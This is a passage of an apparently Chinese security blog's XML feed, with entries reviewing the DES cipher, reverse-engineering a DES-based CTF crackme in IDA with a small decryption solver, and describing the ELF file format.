    <summary type="html">&lt;h1 id=&quot;中间相遇攻击-MITM&quot;&gt;&lt;a href=&quot;#中间相遇攻击-MITM&quot; class=&quot;headerlink&quot; title=&quot;中间相遇攻击 - MITM&quot;&gt;&lt;/a&gt;中间相遇攻击 - MITM&lt;/h1&gt;&lt;h2 id=&quot;What’s-MITM&quot;&gt;&lt;a href=&quot;#Wh</summary>
      
    
    
    
    <category term="cryptography" scheme="http://example.com/categories/cryptography/"/>
    
    
    <category term="MITM" scheme="http://example.com/tags/MITM/"/>
    
    <category term="triple-DES" scheme="http://example.com/tags/triple-DES/"/>
    
    <category term="double-DES" scheme="http://example.com/tags/double-DES/"/>
    
  </entry>
  
  <entry>
    <title>DES逆向分析</title>
    <link href="http://example.com/2021/05/06/cryp_DES%E9%80%86%E5%90%91/"/>
    <id>http://example.com/2021/05/06/cryp_DES%E9%80%86%E5%90%91/</id>
    <published>2021-05-05T19:08:30.897Z</published>
    <updated>2021-05-16T17:26:34.929Z</updated>
    
    <content type="html"><![CDATA[<h2 id="DES加密过程回顾"><a href="#DES加密过程回顾" class="headerlink" title="DES加密过程回顾"></a>DES加密过程回顾</h2><p>DES是一个分组加密算法，典型的DES以64位为分组对数据加密，加密和解密用的是同一个算法。整个DES加密过程，可以大致分为如下几个阶段：</p><p>初始置换、生成子密钥、迭代过程、最后逆置换 （其中迭代过程包括：扩展置换E、S盒代替、P盒置换）</p><p><strong>初始IP置换：</strong></p><p>加密开始时，对输入的长度为64位的明文，进行初始置换 IPIP。其置换方式如下图中 8×88×8 的表格所示：</p><div class="table-container"><table><thead><tr><th>58</th><th>50</th><th>42</th><th>34</th><th>26</th><th>18</th><th>10</th><th>2</th></tr></thead><tbody><tr><td>60</td><td>52</td><td>44</td><td>36</td><td>28</td><td>20</td><td>12</td><td>4</td></tr><tr><td>62</td><td>54</td><td>46</td><td>38</td><td>30</td><td>22</td><td>14</td><td>6</td></tr><tr><td>64</td><td>56</td><td>48</td><td>40</td><td>32</td><td>24</td><td>16</td><td>8</td></tr><tr><td>57</td><td>49</td><td>41</td><td>33</td><td>25</td><td>17</td><td>9</td><td>1</td></tr><tr><td>59</td><td>51</td><td>43</td><td>35</td><td>27</td><td>19</td><td>11</td><td>3</td></tr><tr><td>61</td><td>53</td><td>45</td><td>37</td><td>29</td><td>21</td><td>13</td><td>5</td></tr><tr><td>63</td><td>55</td><td>47</td><td>39</td><td>31</td><td>23</td><td>15</td><td>7</td></tr></tbody></table></div><p>即：表中的数字代表新数据中此位置的数据在原数据中的位置，即原数据块的第58位放到新数据的第1位</p><p><strong>子密钥生成：</strong></p><p>DES 加密共执行16次迭代，每次迭代过程的数据长度为48位，因此需要16个48位的子密钥来进行加密，生成子密钥的过程如下：</p><p><img src="https://i.loli.net/2021/05/04/SNTe8sQKwIMrHV9.png" alt="DES子密钥生成.png"></p><p><strong>迭代过程：</strong></p><p><img src="https://i.loli.net/2021/05/04/62bDGESo95THNad.png" alt="DES迭代过程.png"></p><p>E扩展：</p><div class="table-container"><table><thead><tr><th>32</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th></tr></thead><tbody><tr><td>4</td><td>5</td><td>6</td><td>7</td><td>8</td><td>9</td></tr><tr><td>8</td><td>9</td><td>10</td><td>11</td><td>12</td><td>13</td></tr><tr><td>12</td><td>13</td><td>14</td><td>15</td><td>16</td><td>17</td></tr><tr><td>16</td><td>17</td><td>18</td><td>19</td><td>20</td><td>21</td></tr><tr><td>20</td><td>21</td><td>22</td><td>23</td><td>24</td><td>25</td></tr><tr><td>24</td><td>25</td><td>26</td><td>27</td><td>28</td><td>29</td></tr><tr><td>28</td><td>29</td><td>30</td><td>31</td><td>32</td><td>1</td></tr></tbody></table></div><p>经过 E扩展 的变换，结果中的各位，依次为输入的第32, 1, 2, …, 32, 1位。可以看到，输入的有些位，在输出中重复出现了。所以输出的位数，由输入时的32，增加到了48。</p><p>S盒替换：</p><p>E扩展得到的结果仍然是48位的。将其每6位编为一组，共8组记为：</p><script type="math/tex; mode=display">B_{1}B_{2}B_{3}B_{4}B_{5}B_{6}B_{7}B_{8}</script><p>然后，对每一个 Bi，使用对应的S-box进行变换，并将结果继续拼接起来。</p><p>对于长度为6位的输入，根据其第1, 6位确定所在行，再根据其第2至5位确定所在列，找到对应的值，即为sbox的输出结果。</p><div class="table-container"><table><thead><tr><th><strong>S1</strong></th><th><strong>x0000x</strong></th><th><strong>x0001x</strong></th><th><strong>x0010x</strong></th><th><strong>x0011x</strong></th><th><strong>x0100x</strong></th><th><strong>x0101x</strong></th><th><strong>x0110x</strong></th><th><strong>x0111x</strong></th><th><strong>x1000x</strong></th><th><strong>x1001x</strong></th><th><strong>x1010x</strong></th><th><strong>x1011x</strong></th><th><strong>x1100x</strong></th><th><strong>x1101x</strong></th><th><strong>x1110x</strong></th><th><strong>x1111x</strong></th></tr></thead><tbody><tr><td><strong>0yyyy0</strong></td><td>14</td><td>4</td><td>13</td><td>1</td><td>2</td><td>15</td><td>11</td><td>8</td><td>3</td><td>10</td><td>6</td><td>12</td><td>5</td><td>9</td><td>0</td><td>7</td></tr><tr><td><strong>0yyyy1</strong></td><td>0</td><td>15</td><td>7</td><td>4</td><td>14</td><td>2</td><td>13</td><td>1</td><td>10</td><td>6</td><td>12</td><td>11</td><td>9</td><td>5</td><td>3</td><td>8</td></tr><tr><td><strong>1yyyy0</strong></td><td>4</td><td>1</td><td>14</td><td>8</td><td>13</td><td>6</td><td>2</td><td>11</td><td>15</td><td>12</td><td>9</td><td>7</td><td>3</td><td>10</td><td>5</td><td>0</td></tr><tr><td><strong>1yyyy1</strong></td><td>15</td><td>12</td><td>8</td><td>2</td><td>4</td><td>9</td><td>1</td><td>7</td><td>5</td><td>11</td><td>3</td><td>14</td><td>10</td><td>0</td><td>6</td><td>13</td></tr></tbody></table></div><p>，如果输入是 011011，那么其变换的结果是在第2行，倒数第3列，值为5=0101。所以：</p><script type="math/tex; mode=display">S_{1}(011011)=0101</script><p>对于这8个 Bi，通过 SiSi 全部计算完成后再拼接，得到长度为32位的结果：</p><p>P盒置换：</p><div class="table-container"><table><thead><tr><th>16</th><th>7</th><th>20</th><th>21</th><th>29</th><th>12</th><th>28</th><th>17</th></tr></thead><tbody><tr><td>1</td><td>15</td><td>23</td><td>26</td><td>5</td><td>18</td><td>31</td><td>10</td></tr><tr><td>2</td><td>8</td><td>24</td><td>14</td><td>32</td><td>27</td><td>3</td><td>9</td></tr><tr><td>19</td><td>13</td><td>30</td><td>6</td><td>22</td><td>11</td><td>4</td><td>25</td></tr></tbody></table></div><p>表中的数字代表原数据中此位置的数据在新数据中的位置，即原数据块的第16位放到新数据的第1位，第7位放到第2位，……依此类推，第25位放到第32位。</p><p>最后IP逆置换：</p><div class="table-container"><table><thead><tr><th>40</th><th>8</th><th>48</th><th>16</th><th>56</th><th>24</th><th>64</th><th>32</th></tr></thead><tbody><tr><td>39</td><td>7</td><td>47</td><td>15</td><td>55</td><td>23</td><td>63</td><td>31</td></tr><tr><td>38</td><td>6</td><td>46</td><td>14</td><td>54</td><td>22</td><td>62</td><td>30</td></tr><tr><td>37</td><td>5</td><td>45</td><td>13</td><td>53</td><td>21</td><td>61</td><td>29</td></tr><tr><td>36</td><td>4</td><td>44</td><td>12</td><td>52</td><td>20</td><td>60</td><td>28</td></tr><tr><td>35</td><td>3</td><td>43</td><td>11</td><td>51</td><td>19</td><td>59</td><td>27</td></tr><tr><td>34</td><td>2</td><td>42</td><td>10</td><td>50</td><td>18</td><td>58</td><td>26</td></tr><tr><td>33</td><td>1</td><td>41</td><td>9</td><td>49</td><td>17</td><td>57</td><td>25</td></tr></tbody></table></div><p>以上是对DES加密算法的简单回顾</p><p>下面我们以desenc.exe为实例对DES加密函数进行具体分析</p><p><img src="https://i.loli.net/2021/05/06/3PFkJlhIUDyEOwr.png" alt="DESen.png"></p><p>运行该小程序后发现我们需要输入一个被加密的字符串，测试后发现，我们输入某个正确的八位字符串即可获取flag.</p><p>下面借助IDA对其中的关键函数进行分析：</p><h2 id="main函数分析"><a href="#main函数分析" class="headerlink" title="main函数分析"></a>main函数分析</h2><p><img src="https://i.loli.net/2021/05/06/ZnwJh8SX3ORKU5T.png" alt="DES_IDA.png"></p><p>首先借助IDA的F5反编译插件查看main函数伪代码，获取加密大致流程：</p><ul><li>首先字符串”DE3_En1c”被放入v7字符数组中，根据其为8字节共64bit而且此程序为加密函数可以分析出v7字符数组应该储存的是密钥</li><li>其次获取用户输入并将用户输入储存在Str字符数组中，判断此为明文输入</li><li>接着对用户输入长度进行判断，若用户输入字符长度为8则进入加密子程序</li><li><strong>sub_40100F((int)v7)</strong>根据该函数处理的数据为密钥v7,猜测此函数为密钥生成函数</li><li><strong>sub_401032(Str, v5);</strong>根据输入参数可以猜测此函数对用户输入进行加密并将加密后密文储存在v5字符数组中</li><li>最后将密文同指定的字符数组进行比较，若一致则最终可以get flag</li></ul><p>下面对子密钥生成模块和加密迭代过程模块过程进行重点分析：</p><h2 id="DES子密钥生成模块分析"><a href="#DES子密钥生成模块分析" class="headerlink" title="DES子密钥生成模块分析"></a>DES子密钥生成模块分析</h2><p><strong>sub_40100F((int)v7)</strong>跟进该函数：</p><p><img src="https://i.loli.net/2021/05/06/yIoUFT81twGz6L4.png" alt="DES_Key.png"></p><p><strong>sub_40101E(a1, v6, 8)分析</strong></p><p><img src="https://i.loli.net/2021/05/06/7oFzeRmViPkx3Yw.png" alt="DES_Key1.png"></p><p>该函数参数为a1,v6,8 该函数将固定的数据a1作为参数处理，将结果储存在栈空间v6中。</p><p>该函数取参数中每一字节数据的每一位，并将每一位数据再放入一个字节中。</p><p><strong>result = (void *)sub_401046(v6, v4);</strong>分析</p><p>跟进函数sub_401046(v6, v4)</p><p><img src="https://i.loli.net/2021/05/06/fZspba97gjnmUSt.png" alt="DES_Key2.png"></p><p>该函数利用栈中数据v6作为参数进行56轮的处理，每一轮循环都是根据字节 数组0x4280EC处的值来将v6中的数据放入输出地址a2处， 经过该函数，输入的64字节数据变成了56字节数据，这是子密钥生成算法的的第一步PC-1置换选择</p><p>接下来应该是两部分子密钥进行循环左移的过程</p><p><img src="https://i.loli.net/2021/05/06/8kSaRgoHl9WdPAy.png" alt="DES_Key4.png"></p><p><strong>sub_401014(v4, (int)v4, byte_428154[i]);</strong>分析：</p><p><img src="https://i.loli.net/2021/05/06/aorVd5hktPTONLu.png" alt="DES_Key3.png"></p><ul><li>函数sub_4014F0就是循环移位的函数，分别对 56位密钥中的左右两个子密钥进行移位。</li><li>经过16轮循环生成16组子密钥</li></ul><h2 id="DES加密模块分析"><a href="#DES加密模块分析" class="headerlink" title="DES加密模块分析"></a>DES加密模块分析</h2><p><strong>sub_401032(Str, v5)</strong></p><p>跟进该函数</p><p><img src="https://i.loli.net/2021/05/06/WgdDZBXJbaU37L6.png" alt="DES_Func.jpg"></p><p><strong>sub_40101E(a1, (int)Src, 8)</strong>分析：</p><p>该函数同子密钥生成模块第一个函数一样：将用户的输入中的每一位提取出来转换成一个64字节的数组；</p><p><strong>sub_401028(Src, (int)Src);</strong>分析</p><p>跟进该函数：</p><p><img src="https://i.loli.net/2021/05/06/zksxNF2AnS8vbYc.png" alt="DES_Func1.png"></p><p>该部分0对这64字节数组进行处理，即加密过程中的IP置换；</p><p><strong>两次memcpy调用分析：</strong></p><p>跟进函数结合DES过程分析这部分分成了左右两个分组</p><p><strong>十六轮循环迭代部分：</strong></p><p>for循环完成前十五轮迭代</p><p>for循环后完成最后一轮迭代</p><p><img src="https://i.loli.net/2021/05/06/khcYPVR3QBdtiZj.png" alt="DES_Func2 _2_.png"></p><p>  <strong>sub_401005((int)v3, v5, (int)&amp;unk_42DC9C + 48 * i);</strong>分析：</p><p><img src="https://i.loli.net/2021/05/06/2XczYpNhDwmsTE6.png" alt="DES_Func3.png"></p><ul><li><p>sub_40104B(a1, (int)v5)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int8 __cdecl <span class="title">sub_401660</span><span class="params">(<span class="keyword">void</span> *Src, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 result; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+4Ch] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">48</span>]; <span class="comment">// [esp+50h] [ebp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">unsigned</span> __int8)<span class="built_in">memcpy</span>(v4, Src, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">48</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *((_BYTE *)&amp;i + byte_42809C[i] + <span class="number">3</span>);</span><br><span class="line">    *(_BYTE *)(i + a2) = result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a1为一个32字节的数据，v5则是分配的栈上的 空间，大小为0x30（48）字节，跟进该函数可知这部分为E扩展</p></li><li><p>sub_401023(v5, a3, 48)函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_401900</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+4Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a3; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(i + a1) = (*(_BYTE *)(i + a2) + *(_BYTE *)(i + a1)) &amp; <span class="number">1</span>;</span><br><span class="line">    result = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>该函数将第一个参数和第二个参数逐字节的相加，并将结果‘与’ 上0x1（也即取最低位），这其实就是异或的操作， 也是标准DES加密过程中右边分组经扩展置换后与 密钥进行异或的部分</p></li><li><p>sub_40103C(v5, Src)</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_4016F0</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+4Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+58h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+5Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v5 &lt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = byte_428164[<span class="number">64</span> * v5</span><br><span class="line">                   + <span class="number">16</span> * ((*(_BYTE *)(a1 + <span class="number">6</span> * v5 + <span class="number">5</span>) | (<span class="keyword">unsigned</span> __int8)(<span class="number">2</span> * *(_BYTE *)(a1 + <span class="number">6</span> * v5))) &amp; <span class="number">3</span>)</span><br><span class="line">                   + ((*(_BYTE *)(a1 + <span class="number">6</span> * v5 + <span class="number">4</span>) | (<span class="keyword">unsigned</span> __int8)((<span class="number">2</span> * *(_BYTE *)(a1 + <span class="number">6</span> * v5 + <span class="number">3</span>)) | (<span class="number">4</span> * *(_BYTE *)(a1 + <span class="number">6</span> * v5 + <span class="number">2</span>)) | (<span class="number">8</span> * *(_BYTE *)(a1 + <span class="number">6</span> * v5 + <span class="number">1</span>)))) &amp; <span class="number">0xF</span>)] &amp; <span class="number">0xF</span>;</span><br><span class="line">    *(_BYTE *)(v4 + a2) = (v3 &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(v4 + a2 + <span class="number">1</span>) = (v3 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(v4 + a2 + <span class="number">2</span>) = (v3 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(v4 + a2 + <span class="number">3</span>) = v3 &amp; <span class="number">1</span>;</span><br><span class="line">    v4 += <span class="number">4</span>;</span><br><span class="line">    result = ++v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据迭代流程猜测此函数为S-box替换，查表将6bit数据替换为4bit数据</p><ul><li>sub_401037(Src, (int)Src)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int8 __cdecl <span class="title">sub_401870</span><span class="params">(<span class="keyword">void</span> *Src, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 result; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+4Ch] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">32</span>]; <span class="comment">// [esp+50h] [ebp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">unsigned</span> __int8)<span class="built_in">memcpy</span>(v4, Src, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *((_BYTE *)&amp;i + byte_4280CC[i] + <span class="number">3</span>);</span><br><span class="line">    *(_BYTE *)(i + a2) = result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数完成P置换部分</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>可转化为：已知加密流程为DES，密钥DE3_En1C：，加密后密文，求明文。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> key[<span class="number">9</span>] = <span class="string">&quot;DE3_En1C&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> plaintext[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> ciphertext[<span class="number">8</span>]=&#123;<span class="number">0xef</span>,<span class="number">0x34</span>,<span class="number">0xd4</span>,<span class="number">0xa3</span>,<span class="number">0xc6</span>,<span class="number">0x84</span>,<span class="number">0xe4</span>,<span class="number">0x23</span>&#125;;</span><br><span class="line">    <span class="comment">//to generate 16 round subkey</span></span><br><span class="line">    get_subkey(key);</span><br><span class="line">    <span class="comment">//to encrypt plaintext</span></span><br><span class="line">    decryption(ciphertext,plaintext);</span><br><span class="line">plaintext[<span class="number">8</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,plaintext);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/06/hbptjoW16B8UcvQ.png" alt="DES_exp.png"></p><p>Finally   :)</p><p><img src="https://i.loli.net/2021/05/06/jyLOhmvkso7AfCI.png" alt="DES_exp_out.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;DES加密过程回顾&quot;&gt;&lt;a href=&quot;#DES加密过程回顾&quot; class=&quot;headerlink&quot; title=&quot;DES加密过程回顾&quot;&gt;&lt;/a&gt;DES加密过程回顾&lt;/h2&gt;&lt;p&gt;DES是一个分组加密算法，典型的DES以64位为分组对数据加密，加密和解密用的是同一</summary>
      
    
    
    
    <category term="cryptography、逆向" scheme="http://example.com/categories/cryptography%E3%80%81%E9%80%86%E5%90%91/"/>
    
    
    <category term="DES、IDA逆向" scheme="http://example.com/tags/DES%E3%80%81IDA%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>linux_ELF文件格式</title>
    <link href="http://example.com/2021/04/23/Linux_ELF%E6%96%87%E4%BB%B6/"/>
    <id>http://example.com/2021/04/23/Linux_ELF%E6%96%87%E4%BB%B6/</id>
    <published>2021-04-23T06:51:21.917Z</published>
    <updated>2021-04-25T15:37:07.879Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux-ELF"><a href="#linux-ELF" class="headerlink" title="linux_ELF"></a>linux_ELF</h1><p>在<a href="https://bupt3xplorer.github.io/2021/04/12/Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/">Linux环境下编译过程</a>一文中简单的提及了linux的ELF文件格式的链接的过程，在此基础上上，本文再次探究ELF文件类型、程序头、节头、符号、重定位、动态链接的内容。</p><h2 id="ELF文件格式"><a href="#ELF文件格式" class="headerlink" title="ELF文件格式"></a><strong>ELF文件格式</strong></h2><p><strong>ELF文件类型</strong></p><p>目标文件有三种类型：</p><ul><li><p>可重定位文件（Relocatable File）包含适合于与其他目标文件链接来创建可执行文件或者共享目标文件的代码和数据。</p></li><li><p>可执行文件（Executable File）包含适合于执行的一个程序，此文件规定了 exec() 如何创建一个程序的进程映像。</p></li><li><p>共享目标文件（Shared Object File）包含可在两种上下文中链接的代码和数据。首先链接编辑器可以将它和其它可重定位文件和共享目标文件一起处理，生成另外一个目标文件。其次，动态链接器（Dynamic Linker）可能将它与某个可执行文件以及其它共享目标一起组合，创建进程映像。</p></li></ul><p><img src="https://i.loli.net/2021/04/10/rPaJSl5UQHMc16s.png" alt="EOF.png"></p><p>一个更清晰易懂的ELF格式：</p><p><img src="https://i.loli.net/2021/04/23/hvCmAw4kEVQ6JqS.png" alt="ELF_type.png"></p><p>文件开始处是一个ELF 头部（ELF  Header），用来描述整个文件的组织。节区部分包含链接视图的大量信息：指令、数据、符号表、重定位信息等等。</p><p>程序头部表（Program Header Table），如果存在的话，告诉系统如何创建进程映像。用来构造进程映像的目标文件必须具有程序头部表，可重定位文件不需要这个表。</p><p>节区头部表（Section  Heade  Table）包含了描述文件节区的信息，每个节区在表中都有一项，每一项给出诸如节区名称、节区大小这类信息。用于链接的目标文件必须包含节区头部表，其他目标文件可以有，也可以没有这个表。</p><h2 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a><strong>ELF Header</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_NIDENT (16)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[EI_NIDENT];     <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Half    e_type;                 <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf32_Half    e_machine;              <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf32_Word    e_version;              <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf32_Addr    e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf32_Off     e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf32_Off     e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf32_Word    e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf32_Half    e_ehsize;               <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf32_Half    e_phentsize;            <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf32_Half    e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf32_Half    e_shentsize;            <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf32_Half    e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf32_Half    e_shstrndx;             <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p>上述的<code>Elf32_Half</code>定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Type for a 16-bit quantity.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf32_Half;</span><br></pre></td></tr></table></figure><p>其中<code>Elf32_Word</code>的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Types for signed and unsigned 32-bit quantities.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Word;</span><br></pre></td></tr></table></figure><p>然后<code>Elf32_Addr</code>与<code>Elf32_Off</code>定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Type of addresses.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Addr;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Type of file offsets.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Off;</span><br></pre></td></tr></table></figure><ul><li><strong>e_ident[EI_NIDENT]</strong></li></ul><p>文件的标识以及标识描述了elf如何编码等信息。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Magic：   7f <span class="number">45</span> 4c <span class="number">46</span> <span class="number">01</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p>关于该结构体的索引可以看下面的表格：</p><div class="table-container"><table><thead><tr><th style="text-align:left">名称</th><th style="text-align:left">取值</th><th style="text-align:left">目的</th></tr></thead><tbody><tr><td style="text-align:left">EI_MAG0</td><td style="text-align:left">0</td><td style="text-align:left">文件标识(0x7f)</td></tr><tr><td style="text-align:left">EI_MAG1</td><td style="text-align:left">1</td><td style="text-align:left">文件标识(E)</td></tr><tr><td style="text-align:left">EI_MAG2</td><td style="text-align:left">2</td><td style="text-align:left">文件标识(L)</td></tr><tr><td style="text-align:left">EI_MAG3</td><td style="text-align:left">3</td><td style="text-align:left">文件标识(F)</td></tr><tr><td 